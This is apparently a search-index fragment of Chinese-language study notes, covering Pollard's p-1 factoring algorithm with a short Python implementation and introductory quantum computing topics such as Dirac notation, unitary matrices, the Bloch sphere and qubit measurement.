\\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p} for some k k \u6240\u4ee5 gcd(a^{k(p-1)} - 1, n) gcd(a^{k(p-1)} - 1, n) \u4e00\u5b9a\u6703\u662f p p \u7684\u500d\u6578 Pollard's p-1 algorithm \u5c31\u662f\u5617\u8a66\u53bb\u69cb\u9020\u51fa k(p-1) k(p-1) \uff0c\u4e26\u4e14\u4ee4 a = 2 a = 2 ( \u53ea\u8981 p \\ne 2 p \\ne 2 \u4e0a\u9762\u7684\u63a8\u8ad6\u5c31\u662f\u5c0d\u7684 ) \u4e5f\u5c31\u662f\u6e2c\u8a66 gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), ... gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), ... \u7576 1 \\times 2 \\times 3 \\cdots 1 \\times 2 \\times 3 \\cdots \u662f p-1 p-1 \u7684\u500d\u6578\uff0c\u6211\u5011\u5c31\u6210\u529f\u5206\u89e3 n n \u4f7f\u7528\u689d\u4ef6 \u7576 p-1 p-1 \u6700\u5927\u7684\u8cea\u56e0\u6578\u5f88\u5c0f \u7a0b\u5f0f\u78bc ( python ) import math def pollard ( n ): a = 2 b = 2 while True : a = pow ( a , b , n ) d = math . gcd ( a - 1 , n ) if 1 < d < n : return d b += 1","title":"Pollard's p - 1 Algorithm"},{"location":"algorithm/factoring/pollard/#pollards-p-1-algorithm","text":"\u6709\u4e00\u500b\u5408\u6578 n n \u6709\u4e00\u500b\u8cea\u56e0\u6578 p p \u6839\u64da\u8cbb\u99ac\u5c0f\u5b9a\u7406\uff0c\u7576 a a \u4e0d\u662f p p \u7684\u500d\u6578 a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p} a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p} for some k k \u6240\u4ee5 gcd(a^{k(p-1)} - 1, n) gcd(a^{k(p-1)} - 1, n) \u4e00\u5b9a\u6703\u662f p p \u7684\u500d\u6578 Pollard's p-1 algorithm \u5c31\u662f\u5617\u8a66\u53bb\u69cb\u9020\u51fa k(p-1) k(p-1) \uff0c\u4e26\u4e14\u4ee4 a = 2 a = 2 ( \u53ea\u8981 p \\ne 2 p \\ne 2 \u4e0a\u9762\u7684\u63a8\u8ad6\u5c31\u662f\u5c0d\u7684 ) \u4e5f\u5c31\u662f\u6e2c\u8a66 gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), ... gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), ... \u7576 1 \\times 2 \\times 3 \\cdots 1 \\times 2 \\times 3 \\cdots \u662f p-1 p-1 \u7684\u500d\u6578\uff0c\u6211\u5011\u5c31\u6210\u529f\u5206\u89e3 n n","title":"Pollard's p - 1 Algorithm"},{"location":"algorithm/factoring/pollard/#_1","text":"\u7576 p-1 p-1 \u6700\u5927\u7684\u8cea\u56e0\u6578\u5f88\u5c0f","title":"\u4f7f\u7528\u689d\u4ef6"},{"location":"algorithm/factoring/pollard/#python","text":"import math def pollard ( n ): a = 2 b = 2 while True : a = pow ( a , b , n ) d = math . gcd ( a - 1 , n ) if 1 < d < n : return d b += 1","title":"\u7a0b\u5f0f\u78bc ( python )"},{"location":"algorithm/factoring/williams/","text":"Williams's p + 1 Algorithm TODO \u76f8\u95dc\u8cc7\u6e90 A p + 1 Method of Factoring","title":"Williams's p + 1 Algorithm"},{"location":"algorithm/factoring/williams/#williamss-p-1-algorithm","text":"TODO","title":"Williams's p + 1 Algorithm"},{"location":"algorithm/factoring/williams/#_1","text":"A p + 1 Method of Factoring","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"algorithm/quantum-algorithm/notation/","text":"Dirac Notation \u5c31\u662f\u53e6\u4e00\u7a2e\u8868\u793a vector \u7684\u65b9\u5f0f\uff0c\u9019\u88e1\u7684\u6578\u5b57\u90fd\u662f\u8907\u6578 |\\mathbf{v}\\rangle = \\begin{bmatrix}v_0\\\\ v_1\\\\ \\cdots\\\\ v_n \\end{bmatrix} |\\mathbf{v}\\rangle = \\begin{bmatrix}v_0\\\\ v_1\\\\ \\cdots\\\\ v_n \\end{bmatrix} \\langle \\mathbf{v}| = \\overline{\\mathbf{v}^T} = \\mathbf{v}^{\\dagger} = [\\ \\overline{v_0} \\ \\overline{v_1} \\ \\cdots \\ \\overline{v_n}\\ ] \\langle \\mathbf{v}| = \\overline{\\mathbf{v}^T} = \\mathbf{v}^{\\dagger} = [\\ \\overline{v_0} \\ \\overline{v_1} \\ \\cdots \\ \\overline{v_n}\\ ] |\\mathbf{v}\\rangle |\\mathbf{v}\\rangle \u53eb\u505a \"ket-v\" \\langle \\mathbf{v}| \\langle \\mathbf{v}| \u53eb\u505a \"bra-v\" \\mathbf{v}^{\\dagger} \\mathbf{v}^{\\dagger} \u5c31\u662f\u5171\u8edb\u8f49\u7f6e \\mathbf{v}^T \\mathbf{v}^T \u5c31\u662f\u8f49\u7f6e\u77e9\u9663 ( transpose ) \\overline{v} \\overline{v} \u5c31\u662f\u5171\u8edb\u8907\u6578 ( complex conjugate ) Hilbert Spaces Hilbert Spaces \\mathbb{C}^n \\mathbb{C}^n \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5167\u7a4d ( inner product ) \u662f \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\mathbf{u}^T}\\mathbf{v} = \\overline{u_0} \\cdot v_0 + \\overline{u_1} \\cdot v_1 + \\cdots + \\overline{u_n} \\cdot v_n \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\mathbf{u}^T}\\mathbf{v} = \\overline{u_0} \\cdot v_0 + \\overline{u_1} \\cdot v_1 + \\cdots + \\overline{u_n} \\cdot v_n \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5916\u7a4d ( outer product ) \u662f | \\mathbf{u} \\rangle \\langle \\mathbf{v} | = \\mathbf{u} \\overline{\\mathbf{v}^T} = \\begin{bmatrix} u_0 \\overline{v_0} & u_0 \\overline{v_1} & \\cdots & u_0 \\overline{v_n} \\\\ u_1 \\overline{v_0} & u_1 \\overline{v_1} & \\cdots & u_1 \\overline{v_n} \\\\ \\cdots & \\cdots & \\ddots & \\cdots \\\\ u_n \\overline{v_0} & u_n \\overline{v_1} & \\cdots & u_n \\overline{v_n} \\end{bmatrix} | \\mathbf{u} \\rangle \\langle \\mathbf{v} | = \\mathbf{u} \\overline{\\mathbf{v}^T} = \\begin{bmatrix} u_0 \\overline{v_0} & u_0 \\overline{v_1} & \\cdots & u_0 \\overline{v_n} \\\\ u_1 \\overline{v_0} & u_1 \\overline{v_1} & \\cdots & u_1 \\overline{v_n} \\\\ \\cdots & \\cdots & \\ddots & \\cdots \\\\ u_n \\overline{v_0} & u_n \\overline{v_1} & \\cdots & u_n \\overline{v_n} \\end{bmatrix} \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5f35\u91cf\u7a4d ( tensor product ) \u662f | \\mathbf{u} \\rangle | \\mathbf{v} \\rangle = | \\mathbf{uv} \\rangle = \\begin{bmatrix} u_0 \\cdot v_0 \\\\ u_0 \\cdot v_1 \\\\ \\vdots \\\\ u_0 \\cdot v_n \\\\ u_1 \\cdot v_0 \\\\ \\vdots \\\\ u_{m-1} \\cdot v_n \\\\ u_m \\cdot v_0 \\\\ \\vdots \\\\u_m \\cdot v_n \\end{bmatrix} | \\mathbf{u} \\rangle | \\mathbf{v} \\rangle = | \\mathbf{uv} \\rangle = \\begin{bmatrix} u_0 \\cdot v_0 \\\\ u_0 \\cdot v_1 \\\\ \\vdots \\\\ u_0 \\cdot v_n \\\\ u_1 \\cdot v_0 \\\\ \\vdots \\\\ u_{m-1} \\cdot v_n \\\\ u_m \\cdot v_0 \\\\ \\vdots \\\\u_m \\cdot v_n \\end{bmatrix} \\mathbf{v} \\mathbf{v} \u7684\u9577\u5ea6 ( norm ) \u662f \\| \\mathbf{v} \\| = \\sqrt{\\langle \\mathbf{v} | \\mathbf{v} \\rangle} \\| \\mathbf{v} \\| = \\sqrt{\\langle \\mathbf{v} | \\mathbf{v} \\rangle} \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\langle \\mathbf{v} | \\mathbf{u} \\rangle} \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\langle \\mathbf{v} | \\mathbf{u} \\rangle} \\langle \\mathbf{u} | a_0\\mathbf{v} + a_1\\mathbf{w} \\rangle = a_0 \\langle \\mathbf{u} | \\mathbf{v} \\rangle + a_1 \\langle \\mathbf{u} | \\mathbf{w} \\rangle \\langle \\mathbf{u} | a_0\\mathbf{v} + a_1\\mathbf{w} \\rangle = a_0 \\langle \\mathbf{u} | \\mathbf{v} \\rangle + a_1 \\langle \\mathbf{u} | \\mathbf{w} \\rangle Qubit Info |0\\rangle, |1\\rangle |0\\rangle, |1\\rangle can be any two vectors that form an orthonormal basis in \\mathbb{C}^2 \\mathbb{C}^2 |0\\rangle = \\begin{bmatrix} 1\\\\ 0 \\end{bmatrix}, |1\\rangle = \\begin{bmatrix} 0\\\\ 1 \\end{bmatrix} |0\\rangle = \\begin{bmatrix} 1\\\\ 0 \\end{bmatrix}, |1\\rangle = \\begin{bmatrix} 0\\\\ 1 \\end{bmatrix} \u56e0\u70ba |0\\rangle |0\\rangle and |1\\rangle |1\\rangle are orthonormal \\langle 0 | 1 \\rangle = \\langle 1 | 0 \\rangle = 0 \\langle 0 | 1 \\rangle = \\langle 1 | 0 \\rangle = 0 \\langle 0 | 0 \\rangle = \\langle 1 | 1 \\rangle = 1 \\langle 0 | 0 \\rangle = \\langle 1 | 1 \\rangle = 1 |101\\rangle = |1\\rangle \\oplus |0\\rangle \\oplus |1\\rangle |101\\rangle = |1\\rangle \\oplus |0\\rangle \\oplus |1\\rangle Unitary Matrix U U \u662f Unitary Matrix \\Leftrightarrow U^{-1} = U^{\\dagger} \\Leftrightarrow U^{-1} = U^{\\dagger} U U \u662f Unitary Matrix \u7684\u8a71 U^{\\dagger} U^{\\dagger} \u662f Unitary Matrix |det(U)| = 1 |det(U)| = 1 Bloch Sphere \u6211\u5011\u53ef\u4ee5\u7528 (\\theta, \\phi) (\\theta, \\phi) \u4f86\u8868\u793a\u6240\u6709 linear combination of | 0 \\rangle, | 1 \\rangle | 0 \\rangle, | 1 \\rangle | \\psi \\rangle = a_0 | 0 \\rangle + a_1 | 1 \\rangle | \\psi \\rangle = a_0 | 0 \\rangle + a_1 | 1 \\rangle |\\psi\\rangle = e^{i\\gamma}(cos\\frac{\\theta}{2}|0\\rangle+e^{i\\varphi}sin\\frac{\\theta}{2}|1\\rangle) |\\psi\\rangle = e^{i\\gamma}(cos\\frac{\\theta}{2}|0\\rangle+e^{i\\varphi}sin\\frac{\\theta}{2}|1\\rangle)","title":"Notation"},{"location":"algorithm/quantum-algorithm/notation/#dirac-notation","text":"\u5c31\u662f\u53e6\u4e00\u7a2e\u8868\u793a vector \u7684\u65b9\u5f0f\uff0c\u9019\u88e1\u7684\u6578\u5b57\u90fd\u662f\u8907\u6578 |\\mathbf{v}\\rangle = \\begin{bmatrix}v_0\\\\ v_1\\\\ \\cdots\\\\ v_n \\end{bmatrix} |\\mathbf{v}\\rangle = \\begin{bmatrix}v_0\\\\ v_1\\\\ \\cdots\\\\ v_n \\end{bmatrix} \\langle \\mathbf{v}| = \\overline{\\mathbf{v}^T} = \\mathbf{v}^{\\dagger} = [\\ \\overline{v_0} \\ \\overline{v_1} \\ \\cdots \\ \\overline{v_n}\\ ] \\langle \\mathbf{v}| = \\overline{\\mathbf{v}^T} = \\mathbf{v}^{\\dagger} = [\\ \\overline{v_0} \\ \\overline{v_1} \\ \\cdots \\ \\overline{v_n}\\ ] |\\mathbf{v}\\rangle |\\mathbf{v}\\rangle \u53eb\u505a \"ket-v\" \\langle \\mathbf{v}| \\langle \\mathbf{v}| \u53eb\u505a \"bra-v\" \\mathbf{v}^{\\dagger} \\mathbf{v}^{\\dagger} \u5c31\u662f\u5171\u8edb\u8f49\u7f6e \\mathbf{v}^T \\mathbf{v}^T \u5c31\u662f\u8f49\u7f6e\u77e9\u9663 ( transpose ) \\overline{v} \\overline{v} \u5c31\u662f\u5171\u8edb\u8907\u6578 ( complex conjugate )","title":"Dirac Notation"},{"location":"algorithm/quantum-algorithm/notation/#hilbert-spaces","text":"Hilbert Spaces \\mathbb{C}^n \\mathbb{C}^n \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5167\u7a4d ( inner product ) \u662f \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\mathbf{u}^T}\\mathbf{v} = \\overline{u_0} \\cdot v_0 + \\overline{u_1} \\cdot v_1 + \\cdots + \\overline{u_n} \\cdot v_n \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\mathbf{u}^T}\\mathbf{v} = \\overline{u_0} \\cdot v_0 + \\overline{u_1} \\cdot v_1 + \\cdots + \\overline{u_n} \\cdot v_n \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5916\u7a4d ( outer product ) \u662f | \\mathbf{u} \\rangle \\langle \\mathbf{v} | = \\mathbf{u} \\overline{\\mathbf{v}^T} = \\begin{bmatrix} u_0 \\overline{v_0} & u_0 \\overline{v_1} & \\cdots & u_0 \\overline{v_n} \\\\ u_1 \\overline{v_0} & u_1 \\overline{v_1} & \\cdots & u_1 \\overline{v_n} \\\\ \\cdots & \\cdots & \\ddots & \\cdots \\\\ u_n \\overline{v_0} & u_n \\overline{v_1} & \\cdots & u_n \\overline{v_n} \\end{bmatrix} | \\mathbf{u} \\rangle \\langle \\mathbf{v} | = \\mathbf{u} \\overline{\\mathbf{v}^T} = \\begin{bmatrix} u_0 \\overline{v_0} & u_0 \\overline{v_1} & \\cdots & u_0 \\overline{v_n} \\\\ u_1 \\overline{v_0} & u_1 \\overline{v_1} & \\cdots & u_1 \\overline{v_n} \\\\ \\cdots & \\cdots & \\ddots & \\cdots \\\\ u_n \\overline{v_0} & u_n \\overline{v_1} & \\cdots & u_n \\overline{v_n} \\end{bmatrix} \\mathbf{u}, \\mathbf{v} \\mathbf{u}, \\mathbf{v} \u7684\u5f35\u91cf\u7a4d ( tensor product ) \u662f | \\mathbf{u} \\rangle | \\mathbf{v} \\rangle = | \\mathbf{uv} \\rangle = \\begin{bmatrix} u_0 \\cdot v_0 \\\\ u_0 \\cdot v_1 \\\\ \\vdots \\\\ u_0 \\cdot v_n \\\\ u_1 \\cdot v_0 \\\\ \\vdots \\\\ u_{m-1} \\cdot v_n \\\\ u_m \\cdot v_0 \\\\ \\vdots \\\\u_m \\cdot v_n \\end{bmatrix} | \\mathbf{u} \\rangle | \\mathbf{v} \\rangle = | \\mathbf{uv} \\rangle = \\begin{bmatrix} u_0 \\cdot v_0 \\\\ u_0 \\cdot v_1 \\\\ \\vdots \\\\ u_0 \\cdot v_n \\\\ u_1 \\cdot v_0 \\\\ \\vdots \\\\ u_{m-1} \\cdot v_n \\\\ u_m \\cdot v_0 \\\\ \\vdots \\\\u_m \\cdot v_n \\end{bmatrix} \\mathbf{v} \\mathbf{v} \u7684\u9577\u5ea6 ( norm ) \u662f \\| \\mathbf{v} \\| = \\sqrt{\\langle \\mathbf{v} | \\mathbf{v} \\rangle} \\| \\mathbf{v} \\| = \\sqrt{\\langle \\mathbf{v} | \\mathbf{v} \\rangle} \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\langle \\mathbf{v} | \\mathbf{u} \\rangle} \\langle \\mathbf{u} | \\mathbf{v} \\rangle = \\overline{\\langle \\mathbf{v} | \\mathbf{u} \\rangle} \\langle \\mathbf{u} | a_0\\mathbf{v} + a_1\\mathbf{w} \\rangle = a_0 \\langle \\mathbf{u} | \\mathbf{v} \\rangle + a_1 \\langle \\mathbf{u} | \\mathbf{w} \\rangle \\langle \\mathbf{u} | a_0\\mathbf{v} + a_1\\mathbf{w} \\rangle = a_0 \\langle \\mathbf{u} | \\mathbf{v} \\rangle + a_1 \\langle \\mathbf{u} | \\mathbf{w} \\rangle","title":"Hilbert Spaces"},{"location":"algorithm/quantum-algorithm/notation/#qubit","text":"Info |0\\rangle, |1\\rangle |0\\rangle, |1\\rangle can be any two vectors that form an orthonormal basis in \\mathbb{C}^2 \\mathbb{C}^2 |0\\rangle = \\begin{bmatrix} 1\\\\ 0 \\end{bmatrix}, |1\\rangle = \\begin{bmatrix} 0\\\\ 1 \\end{bmatrix} |0\\rangle = \\begin{bmatrix} 1\\\\ 0 \\end{bmatrix}, |1\\rangle = \\begin{bmatrix} 0\\\\ 1 \\end{bmatrix} \u56e0\u70ba |0\\rangle |0\\rangle and |1\\rangle |1\\rangle are orthonormal \\langle 0 | 1 \\rangle = \\langle 1 | 0 \\rangle = 0 \\langle 0 | 1 \\rangle = \\langle 1 | 0 \\rangle = 0 \\langle 0 | 0 \\rangle = \\langle 1 | 1 \\rangle = 1 \\langle 0 | 0 \\rangle = \\langle 1 | 1 \\rangle = 1 |101\\rangle = |1\\rangle \\oplus |0\\rangle \\oplus |1\\rangle |101\\rangle = |1\\rangle \\oplus |0\\rangle \\oplus |1\\rangle","title":"Qubit"},{"location":"algorithm/quantum-algorithm/notation/#unitary-matrix","text":"U U \u662f Unitary Matrix \\Leftrightarrow U^{-1} = U^{\\dagger} \\Leftrightarrow U^{-1} = U^{\\dagger} U U \u662f Unitary Matrix \u7684\u8a71 U^{\\dagger} U^{\\dagger} \u662f Unitary Matrix |det(U)| = 1 |det(U)| = 1","title":"Unitary Matrix"},{"location":"algorithm/quantum-algorithm/notation/#bloch-sphere","text":"\u6211\u5011\u53ef\u4ee5\u7528 (\\theta, \\phi) (\\theta, \\phi) \u4f86\u8868\u793a\u6240\u6709 linear combination of | 0 \\rangle, | 1 \\rangle | 0 \\rangle, | 1 \\rangle | \\psi \\rangle = a_0 | 0 \\rangle + a_1 | 1 \\rangle | \\psi \\rangle = a_0 | 0 \\rangle + a_1 | 1 \\rangle |\\psi\\rangle = e^{i\\gamma}(cos\\frac{\\theta}{2}|0\\rangle+e^{i\\varphi}sin\\frac{\\theta}{2}|1\\rangle) |\\psi\\rangle = e^{i\\gamma}(cos\\frac{\\theta}{2}|0\\rangle+e^{i\\varphi}sin\\frac{\\theta}{2}|1\\rangle)","title":"Bloch Sphere"},{"location":"algorithm/quantum-algorithm/quantum-bits/","text":"\u4e00\u500b\u91cf\u5b50\u4f4d\u5143 ( 1 qubit ) \u72c0\u614b \u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u53ea\u6703\u6709\u5169\u7a2e\u72c0\u614b\uff0c0 \u6216 1 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u7684\u72c0\u614b\u53ef\u4ee5\u662f |0\\rangle |0\\rangle \u6216\u662f |1\\rangle |1\\rangle \u6216\u662f\u4ed6\u5011\u7684\u7dda\u6027\u7d44\u5408 |\\psi \\rangle = \\alpha |0\\rangle + \\beta |1|0\\rangle |\\psi \\rangle = \\alpha |0\\rangle + \\beta |1|0\\rangle |0\\rangle, |1\\rangle |0\\rangle, |1\\rangle \u6211\u5011\u7a31\u4ed6\u70ba computational basis state \u6240\u4ee5\u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\u7684\u4f4d\u5143\uff0c\u6211\u5011\u8aaa\u4ed6\u662f\u8655\u5728\u4e00\u500b \u758a\u52a0\u614b \u9019\u908a\u7684 \\alpha, \\beta \\alpha, \\beta \u662f\u8907\u6578 ( Complex Number )\uff0c\u7406\u8ad6\u4e0a\u91cf\u5b50\u8a08\u7b97\u6a5f\u7684\u4e00\u500b\u4f4d\u5143\u53ef\u4ee5\u6709\u7121\u9650\u591a\u7a2e\u72c0\u614b \u89c0\u6e2c \u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u89c0\u6e2c\u4e00\u500b\u4f4d\u5143\uff0c\u5c31\u53ea\u662f\u628a\u4ed6\u7684\u72c0\u614b\u53d6\u51fa\u4f86\uff0c\u4ed6\u7684\u72c0\u614b\u662f 0 \u6211\u5011\u5c31\u89c0\u6e2c\u5230 0\uff0c\u4ed6\u7684\u72c0\u614b\u662f 1 \u6211\u5011\u5c31\u89c0\u6e2c\u5230 1\uff0c\u975e\u5e38\u7684\u76f4\u89ba \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u89c0\u6e2c\u4e00\u500b\u4f4d\u5143\uff0c\u6709 |\\alpha|^2 |\\alpha|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0\uff0c\u6709 |\\beta|^2 |\\beta|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 1 \u6a5f\u7387\u7e3d\u548c\u6703\u662f 1\uff0c\u6240\u4ee5 \\alpha, \\beta \\alpha, \\beta \u5fc5\u9808\u6eff\u8db3 |\\alpha|^2 + |\\beta|^2 = 1 |\\alpha|^2 + |\\beta|^2 = 1 \uff0c\u9019\u500b\u689d\u4ef6\u53eb\u505a normalization condition \u4e0d\u540c\u65bc\u50b3\u7d71\u8a08\u7b97\u6a5f\uff0c\u91cf\u5b50\u8a08\u7b97\u6a5f\u5728\u89c0\u6e2c\u5f8c\u6703\u7834\u58de\u539f\u672c\u7684\u72c0\u614b\uff0c\u6211\u5011\u7a31\u505a \u91cf\u5b50\u584c\u9677 ( collapse )\uff0c\u4e5f\u5c31\u662f \u89c0\u6e2c\u51fa 0 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u5c31\u6703\u8b8a |0\\rangle |0\\rangle \uff0c\u89c0\u6e2c\u51fa 1 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u5c31\u6703\u8b8a |1\\rangle |1\\rangle \u6240\u4ee5\u4e8b\u5be6\u4e0a\uff0c\u6211\u5011\u6c92\u8fa6\u6cd5\u89c0\u6e2c\u51fa\u91cf\u5b50\u4f4d\u5143\u7684\u771f\u5be6\u72c0\u614b \\alpha, \\beta \\alpha, \\beta \u5169\u500b\u91cf\u5b50\u4f4d\u5143 ( 2 qubits ) 2 qubits \u6703\u6709 4 \u500b computational basis state: |00\\rangle, |01\\rangle, |10\\rangle, |11\\rangle |00\\rangle, |01\\rangle, |10\\rangle, |11\\rangle \u6240\u4ee5 2 qubits \u7684\u72c0\u614b\u53ef\u4ee5\u662f |\\psi\\rangle = \\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle + \\alpha_{10} |10\\rangle + \\alpha_{11} |11\\rangle |\\psi\\rangle = \\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle + \\alpha_{10} |10\\rangle + \\alpha_{11} |11\\rangle \u89c0\u6e2c\u7b2c\u4e00\u500b qubit \u7684\u6642\u5019\uff0c\u6709 |\\alpha_{00}|^2 + |\\alpha_{01}|^2 |\\alpha_{00}|^2 + |\\alpha_{01}|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0 \u89c0\u6e2c\u51fa 0 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u6703\u53ea\u5269\u4e0b\u7b2c\u4e00\u500b qubit \u6709 0 \u7684\u9805\uff0c\u4e26\u4e14\u8981\u6eff\u8db3 normalization condition\uff0c\u6240\u4ee5\u6703\u8b8a\u6210 \\frac{\\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle}{\\sqrt{|\\alpha_{00}|^2 + |\\alpha_{01}|^2}} \\frac{\\alpha_{00} |00\\rangle + \\alpha_{01} |01\\rangle}{\\sqrt{|\\alpha_{00}|^2 + |\\alpha_{01}|^2}} \u63a5\u4e0b\u4f86\u6211\u5011\u4f86\u770b\u4e00\u500b\u91cd\u8981\u7684 two qubit \u72c0\u614b\uff0c\u53eb\u505a Bell state \u6216 EPR pair \\frac{|00\\rangle + |11\\rangle}{\\sqrt{2}} \\frac{|00\\rangle + |11\\rangle}{\\sqrt{2}} \u7b2c\u4e00\u500b qubit \u6709 \\frac{1}{2} \\frac{1}{2} \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0\uff0c\u6709 \\frac{1}{2} \\frac{1}{2} \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 1\uff0c\u7b2c\u4e8c\u500b qubit \u4e5f\u662f\u4e00\u6a23\u7684\u60c5\u6cc1 \u591a\u500b\u91cf\u5b50\u4f4d\u5143 \u540c\u7406\uff0cn \u500b\u91cf\u5b50\u4f4d\u5143\u5c31\u6703\u9577\u5f97\u50cf |\\psi\\rangle = \\sum_{x=\\{0, 1\\}^n} \\alpha_{x} |x\\rangle |\\psi\\rangle = \\sum_{x=\\{0, 1\\}^n} \\alpha_{x} |x\\rangle \uff0c \\{0, 1\\}^n \\{0, 1\\}^n \u4ee3\u8868\u7531 0 \u6216 1 \u7d44\u6210\u9577\u5ea6\u70ba n \u7684\u5b57\u4e32","title":"\u5165\u9580\u91cf\u5b50\u96fb\u8166[1]: Quantum Bits"},{"location":"algorithm/quantum-algorithm/quantum-bits/#1-qubit","text":"","title":"\u4e00\u500b\u91cf\u5b50\u4f4d\u5143 ( 1 qubit )"},{"location":"algorithm/quantum-algorithm/quantum-bits/#_1","text":"\u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u53ea\u6703\u6709\u5169\u7a2e\u72c0\u614b\uff0c0 \u6216 1 \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u4e00\u500b\u4f4d\u5143\u7684\u72c0\u614b\u53ef\u4ee5\u662f |0\\rangle |0\\rangle \u6216\u662f |1\\rangle |1\\rangle \u6216\u662f\u4ed6\u5011\u7684\u7dda\u6027\u7d44\u5408 |\\psi \\rangle = \\alpha |0\\rangle + \\beta |1|0\\rangle |\\psi \\rangle = \\alpha |0\\rangle + \\beta |1|0\\rangle |0\\rangle, |1\\rangle |0\\rangle, |1\\rangle \u6211\u5011\u7a31\u4ed6\u70ba computational basis state \u6240\u4ee5\u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\u7684\u4f4d\u5143\uff0c\u6211\u5011\u8aaa\u4ed6\u662f\u8655\u5728\u4e00\u500b \u758a\u52a0\u614b \u9019\u908a\u7684 \\alpha, \\beta \\alpha, \\beta \u662f\u8907\u6578 ( Complex Number )\uff0c\u7406\u8ad6\u4e0a\u91cf\u5b50\u8a08\u7b97\u6a5f\u7684\u4e00\u500b\u4f4d\u5143\u53ef\u4ee5\u6709\u7121\u9650\u591a\u7a2e\u72c0\u614b","title":"\u72c0\u614b"},{"location":"algorithm/quantum-algorithm/quantum-bits/#_2","text":"\u5728\u50b3\u7d71\u8a08\u7b97\u6a5f\u4e2d\uff0c\u89c0\u6e2c\u4e00\u500b\u4f4d\u5143\uff0c\u5c31\u53ea\u662f\u628a\u4ed6\u7684\u72c0\u614b\u53d6\u51fa\u4f86\uff0c\u4ed6\u7684\u72c0\u614b\u662f 0 \u6211\u5011\u5c31\u89c0\u6e2c\u5230 0\uff0c\u4ed6\u7684\u72c0\u614b\u662f 1 \u6211\u5011\u5c31\u89c0\u6e2c\u5230 1\uff0c\u975e\u5e38\u7684\u76f4\u89ba \u5728\u91cf\u5b50\u8a08\u7b97\u6a5f\u4e2d\uff0c\u89c0\u6e2c\u4e00\u500b\u4f4d\u5143\uff0c\u6709 |\\alpha|^2 |\\alpha|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 0\uff0c\u6709 |\\beta|^2 |\\beta|^2 \u7684\u6a5f\u7387\u89c0\u6e2c\u5230 1 \u6a5f\u7387\u7e3d\u548c\u6703\u662f 1\uff0c\u6240\u4ee5 \\alpha, \\beta \\alpha, \\beta \u5fc5\u9808\u6eff\u8db3 |\\alpha|^2 + |\\beta|^2 = 1 |\\alpha|^2 + |\\beta|^2 = 1 \uff0c\u9019\u500b\u689d\u4ef6\u53eb\u505a normalization condition \u4e0d\u540c\u65bc\u50b3\u7d71\u8a08\u7b97\u6a5f\uff0c\u91cf\u5b50\u8a08\u7b97\u6a5f\u5728\u89c0\u6e2c\u5f8c\u6703\u7834\u58de\u539f\u672c\u7684\u72c0\u614b\uff0c\u6211\u5011\u7a31\u505a \u91cf\u5b50\u584c\u9677 ( collapse )\uff0c\u4e5f\u5c31\u662f \u89c0\u6e2c\u51fa 0 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u5c31\u6703\u8b8a |0\\rangle |0\\rangle \uff0c\u89c0\u6e2c\u51fa 1 \u4e4b\u5f8c\uff0c\u8a72\u4f4d\u5143\u7684\u72c0\u614b\u5c31\u6703\u8b8a |1\\rangle |1\\rangle \u6240\u4ee5\u4e8b\u5be6\u4e0a\uff0c\u6211\u5011\u6c92\u8fa6\u6cd5\u89c0\u6e2c\u51fa\u91cf\u5b50\u4f4d\u5143\u7684\u771f\u5be6\u72c0\u614b \\alpha, \\beta \\alpha, \\beta","title":"\u89c0\u6e2c"},{"location":"algorithm/quantum-algorithm/quantum-bits/#2-qubits","text":"2 qubits 